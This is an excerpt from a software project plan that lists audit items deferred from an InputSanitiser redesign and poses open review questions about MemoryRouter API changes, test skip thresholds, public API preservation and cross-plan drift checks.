- **F821 runtime crash bugs** (2026-06-20 audit section 1): `cli/command_history.py:97` (`uuid4`), `core/session.py:237,280` (`Task`), `core/worker_factory.py:581` (`LLMResponse`, `WorkerOutput`), `core/worker_base.py:78` (`TraceEmitter`), `workers/echo_worker.py:69` (`core`). The audit recommends these be addressed in a new P1 Plan 46 (split from the handoff's original P2 Plan 46).
- **Duplicate `Scratchpad` class** in `core/schemas.py` (audit section 6a) — separate plan.
- **ApprovalGate API drift** (audit section 6b, 14+ callers) — separate plan (audit recommends Plan 48).
- **F401 bulk cleanup** (260 unused imports, audit Plan 50) — separate plan.
- **E402 import ordering + missing `gateways/__init__.py`** (audit Plan 47) — separate plan.
- **mypy remediation beyond the 3 files in scope** — separate plan.
- **Any change to InputSanitiser's public API** (`sanitise(text: str) -> str`). The 5 entry points wired in prompt-44 must continue to work without modification.
- **Marine stack** (handoff's original Plan 49) — deferred until after the audit's P1/P2 cleanup.
- **F4 wiring fix** (handoff's original Plan 48: serve.py constructs cognition-loop components but doesn't wire them into the request path). The 2026-06-20 audit section 6b notes that Plan 45 does NOT fix F4. Recommend a separate Plan 48b for F4 wiring after Plans 45-47 land.

**Note on Next 5 queue refill (handoff closing step 7)**: When Plan 45 completes, the "Next 5 prompts" queue must be refilled. The 2026-06-20 audit recommends the new queue be: Plan 46 (F821+critical F841, P1), Plan 47 (E402 + missing `__init__.py`, P2), Plan 48 (ApprovalGate API drift + mypy remediation, P2), Plan 49 (test suite health), Plan 50 (F401 bulk cleanup). Marine stack (handoff's original Plan 49) is deferred until after the audit's P1/P2 cleanup. The handoff's "Deferred" section should be updated to reflect this reprioritisation.

## For Claude review (Devin: do not execute)

**REV2 note**: Round-1 findings 1 and 2 are now resolved in the plan body (Step 1.6 is the authoritative ordering; Step 1.2b adds `_strip_injection_tags` to prevent `_strip_html` shadowing; Step 2.3b adds injection-tag preservation tests; Gate 7's smoke example exercises the `</thinking>` path). Round-1 findings 3 and 4 are resolved via Step 0.3 count verification + STOP S15, and Step 1.3b mapping table + STOP S16. The questions below are the OPEN questions for round-2 review.

1. **MemoryRouter API extension vs trajectory_exporter refactor (landmine L6)**: prompt-37.5 already established that MemoryRouter's backend "doesn't support `fetch(Type, filter_func=...)` pattern". The plan offers two paths: (a) add `fetch_by_type` to MemoryRouter (Step 3), (b) refactor trajectory_exporter to use `scoped_read` + manual filtering (Step 4 fallback). Architecture Rule 11 ("No memory access outside MemoryRouter") permits both. Which is the smaller, less-risky change? Adding a public method to MemoryRouter ripples to its interface contract; refactoring trajectory_exporter keeps the MemoryRouter API stable but moves filtering logic out of the memory layer.

2. **Gate 4 skip-count drift (STOP condition S8)**: if the suite shows 1134 passed but 62 skipped (1 more than baseline, NOT 6 less as expected), is that a STOP or acceptable? The extra skip could be a test that became environment-dependent (legitimate) OR a test that was newly marked skip to dodge a regression (Rule 19 violation). The plan currently treats >61 as STOP — is that the right threshold, or should it allow 61 as an upper bound and treat the expected 55 as the target?

3. **Public API preservation (STOP condition S7)**: the plan says "do not change InputSanitiser's public API". If the redesign adds optional kwargs (e.g., `sanitise(text, *, max_length=10000)`), is that an API change? Existing callers continue to work; new callers can opt-in. The plan currently forbids this — is byte-identical signature the right constraint, or is backward-compatible extension acceptable?

4. **Cross-plan hazard (audit section 9)**: the audit notes `cli/serve.py` will be touched by Plan 46 item 11. Plan 45's drift check includes `cli/serve.py` for read-only verification (STOP condition S11). Is that sufficient, or should Plan 45 explicitly tag `cli/serve.py` at prompt-44 and re-tag at prompt-45 close, so Plan 46's drift check has a stable anchor?

5. **Injection-tag list completeness (REV2 → RESOLVED in REV3)**: Step 1.2b lists 7 injection-tag markers. If Step 1.3b reveals an original literal that is tag-like but NOT in the Step 1.2b list, Devin must extend the list. **REV3 resolution**: sub-step 1.2b.1 now provides the explicit extension procedure (add to list → re-run 1.2b verification → re-run 1.3b mapping table → paste before/after to CHANGELOG → re-evaluate S16). S16 also has a remediation-path note pointing back to 1.2b.1. Round-3 review should confirm the procedure is clear and complete.
